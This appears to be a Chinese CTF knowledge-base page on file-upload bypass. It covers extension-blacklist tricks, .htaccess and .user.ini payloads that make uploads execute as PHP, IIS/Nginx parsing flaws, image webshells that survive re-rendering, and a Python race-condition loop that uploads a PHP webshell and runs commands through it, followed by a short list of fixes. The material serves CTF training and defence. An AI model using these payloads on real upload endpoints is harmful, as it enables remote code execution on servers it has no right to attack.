---
title: 文件上传绕过 — 黑名单 / 解析漏洞 / .htaccess / 条件竞争
tags: [file-upload, upload-labs, htaccess, user-ini, 解析漏洞, 二次渲染, 条件竞争, 图片马]
category: web
triggers: [文件上传, file upload, upload-labs, .htaccess, user.ini, AddType, AddHandler, 解析漏洞, IIS6 分号, cgi.fix_pathinfo, CVE-2013-4547, nginx %00, 二次渲染, 条件竞争, 图片马, ::$DATA, 00 截断, 双写绕过]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/文件上传漏洞.md, https://blog.1997sty.com/, https://vulhub.org/]
---

# 文件上传绕过 — 黑名单 / 解析漏洞 / .htaccess / 条件竞争

## Summary

上传题的检测点是分层的：**前端 → Content-Type → 后缀黑名单/白名单 → 文件头 → 文件大小 → 二次渲染 → 条件竞争**。绕过思路是「找到检测与实际解析不一致的那一层」——最稳的三种是 `.htaccess`/`user.ini` 改解析规则、容器解析漏洞、以及条件竞争的时间差。

## Key Points

- 黑名单几乎总有遗漏：`.htaccess`、`.user.ini`、`.phtml`、`.phar`、`.php5`、以及 Windows 的 `::$DATA`
- **`.htaccess` 是黑名单的天敌**：只要允许上传它，任何后缀都能当 PHP 执行
- 白名单 + 重命名时，只能走解析漏洞或条件竞争，别再堆后缀
- 前端检测和 Content-Type 检测都可抓包直接改，只有服务端后缀/内容检测才是真拦截

## Details

### 检测层与对应绕过

| 检测层 | 绕过 |
|--------|------|
| 前端 JS 后缀校验 | 抓包改 / 禁用 JS / 直接发请求 |
| `Content-Type` | 改成 `image/png` |
| 后缀黑名单 | 大小写、双写、`::$DATA`、末尾点、点+空格+点、`%00` 截断 |
| 后缀白名单 + 重命名 | `.htaccess`、`.user.ini`、解析漏洞、条件竞争 |
| 文件头（`getimagesize`） | 图片马（GIF89a + PHP 代码） |
| 文件大小 / 二次渲染 | 二次渲染差异定位 |
| 先传后删 | 条件竞争 |

### Windows / PHP 特性绕过

```text
shell.php    → shell.PHP        # 大小写
shell.php    → shell.pphphp     # 双写（str_replace 只替换一次）
shell.php    → shell.php::$DATA # NTFS 数据流，落盘仍是 shell.php
shell.php    → shell.php.       # Windows 自动去掉末尾点
shell.php    → shell.php . .    # 点+空格+点
shell.php    → shell.php%00.jpg # PHP < 5.3.4 空字节截断（GET 参数场景）
```

### `.htaccess` 攻击（黑名单通杀）

上传一个 `.htaccess`，把任意后缀映射成 PHP：

```apache
AddType application/x-httpd-php .png
```

```apache
AddHandler php5-script php
```

```apache
<FilesMatch "1997sty">
SetHandler application/x-httpd-php
</FilesMatch>
```

然后正常上传 `muma.php.png` / `info.php.png` / `1.xxx`，访问即执行。

### `.user.ini`（PHP-FPM / CGI 模式）

```ini
auto_prepend_file=1.png
```

上传 `1.png`（内容为 PHP 代码） + `.user.ini`，同目录任意 PHP 被执行前都会先包含 `1.png`。与 `.htaccess` 的区别：`.user.ini` 只对 PHP-CGI/FPM 生效，且需要目录内有可执行 PHP 文件。

### Web 容器解析漏洞

| 容器 | 触发方式 | 原理 |
|------|----------|------|
| Apache | `info.php.png` | 从右向左识别后缀，遇到认识的 `.php` 就按 PHP 解析 |
| IIS 6.0 | `shell.asp;.jpg` | 分号截断，只认分号前的 `.asp` |
| IIS 6.0 | `/shell.asp/1.jpg` | 目录被当脚本解析 |
| IIS 7.x + PHP CGI | `info.png/.php` | `cgi.fix_pathinfo=1`，把不存在的 `.php` 路径回退成 `info.png` |
| Nginx | `/uploadfiles/nginx.png/.php` | 同上（FastCGI 传 SCRIPT_FILENAME 的路径截断） |
| Nginx | `1.gif%00.php` | 空字节截断 |
| Nginx (CVE-2013-4547) | `1.gif .php`（`1.gif%20%00.php`） | 文件名带空格导致解析错位 |

修复：`cgi.fix_pathinfo=0`、关闭 `%00` 处理、禁用 `.htaccess` 上传、限制上传目录不解析脚本。

### 二次渲染

`imagecreatefromgif` / `imagecreatefrompng` 重新生成图片时会丢弃大部分内容，但仍保留部分区块：

- **GIF**：把 payload 写在文件尾部或调色板后的未压缩数据区，对比渲染前后文件找「渲染后仍存在」的位置
- **PNG**：写进 `IDAT` chunk 或 `tEXt` 段
- **JPEG**：最难，通常写进 EXIF/注释段

脚本化流程：上传原图 → 下载渲染后的图 → 二进制 diff → 在保留区插入 payload → 再上传。

### 条件竞争

逻辑漏洞：先 `move_uploaded_file` 落地，再检查后缀并 `unlink`。利用窗口期持续访问该文件执行代码。

```python
# 一边狂传 shell.php，一边狂请求 shell.php
while True: requests.post(url, files={'f': ('shell.php', '<?php system($_GET[1]);?>')})
while True: requests.get(f'{base}/upload/shell.php?1=id')
```

成功率取决于两个线程的节奏，通常需要多进程并发 + 目标环境可写目录可访问。

## 来源标注

| 技术 | 原始出处 | 比赛实例（已核验） |
|------|----------|-------------------|
| `.htaccess` + `AddType`/`AddHandler`/`FilesMatch` | 1997sty 博客《文件上传漏洞》 | **BuildCTF 2024** Babyupload（上传 `.htaccess` + 木马 env 命令执行）；**2024 第四届长城杯初赛**（`AddType application/x-httpd-php .xxx` + `tac` SUID 提权） |
| 容器解析漏洞（Apache/IIS/Nginx/`cgi.fix_pathinfo`） | 1997sty 博客 + vulhub 环境 | 通用 |
| `upload-labs` Pass-2 ~ Pass-20 全量对抗 | upload-labs 靶场 | 通用训练场 |
| 二次渲染 / 条件竞争 | 1997sty 博客 + upload-labs | 通用 |

## Connections

- Related: [[web/php-lfi-getshell-advanced]]、[[web/rce-bypass-techniques]]、[[web/iconv-encoding-bypass-path-traversal]]
- 语料索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [Des-CTF-Knowledge 文件上传漏洞.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/文件上传漏洞.md)

## Open Questions

- 现代框架（Laravel/Spring）上传点到 RCE 的主流跳板已从解析漏洞转为「上传 → 读配置 → 反序列化」，是否值得单独建页？
